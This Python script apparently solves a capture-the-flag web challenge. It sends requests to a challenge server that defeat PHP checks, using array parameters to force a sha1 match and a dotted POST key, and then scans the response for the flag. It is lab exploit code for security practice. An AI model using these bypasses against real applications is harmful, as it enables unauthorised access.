import urllib.request, urllib.parse, re, html as _html, json

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

def test_get_post(get_params, post_dict):
    """Test with GET params and POST body (dict → urlencoded)"""
    full_url = url + '?' + urllib.parse.urlencode(get_params)
    post_data = urllib.parse.urlencode(post_dict).encode('utf-8')
    req = urllib.request.Request(full_url, data=post_data, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    resp = urllib.request.urlopen(req, timeout=10)
    body = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    idx = body.find('?>')
    text = body[idx+2:].strip() if idx > 0 else body[:200]
    return text.replace('\xa0', ' ')

base_get = {'syc': 'Welcome to GEEK 2023!\n', 'lover': '2022e1'}

# Layer 3: qw and yxx POST params → sha1 collision
# Trick: both as arrays → (string)["a"] = "Array", sha1("Array") = sha1("Array")
# But need urlencode → qw[]=a&yxx[]=b
# In urllib, use doseq=True or manual encoding

# Manual encoding for array params
def encode_with_arrays(params):
    parts = []
    for k, v in params.items():
        if isinstance(v, list):
            for item in v:
                parts.append(f'{k}[]={urllib.parse.quote(str(item))}')
        else:
            parts.append(f'{k}={urllib.parse.quote(str(v))}')
    return '&'.join(parts).encode('utf-8')

# Layer 3 only test
post_data = encode_with_arrays({'qw': ['a'], 'yxx': ['b']})
text = test_get_post(base_get, {'qw': 'test'})
# Can't use test_get_post directly for arrays, need custom

# Manual request
full_url = url + '?' + urllib.parse.urlencode(base_get)
req = urllib.request.Request(full_url, data=post_data, headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp = urllib.request.urlopen(req, timeout=10)
body = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
idx = body.find('?>')
text = body[idx+2:].strip() if idx > 0 else body[:200]
print(f"L3 (qw[]=a&yxx[]=b): {text.replace(chr(0xa0), ' ')[:120]}")

# Layer 3+4: add SYC_GEEK.2023
# PHP converts . to _ in POST keys, so we need to send BOTH keys
# Send raw POST body: SYC_GEEK.2023=xxx (dot preserved in raw)
post_data2 = 'qw[]=a&yxx[]=b&SYC_GEEK.2023=Happy+to+see+you%21'.encode('utf-8')
req2 = urllib.request.Request(full_url, data=post_data2, headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp2 = urllib.request.urlopen(req2, timeout=10)
body2 = _html.unescape(re.sub(r'<[^>]+>', '', resp2.read().decode('utf-8', errors='replace')))
idx2 = body2.find('?>')
text2 = body2[idx2+2:].strip() if idx2 > 0 else body2[:200]
print(f"L3+L4 (raw .2023): {text2.replace(chr(0xa0), ' ')[:200]}")

# Check for flag patterns
for pat in ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'DASCTF{', 'GEEK{']:
    if pat in text2:
        idx = text2.find(pat)
        end = text2.find('}', idx)
        if end > idx:
            print(f"FLAG: {text2[idx:end+1]}")
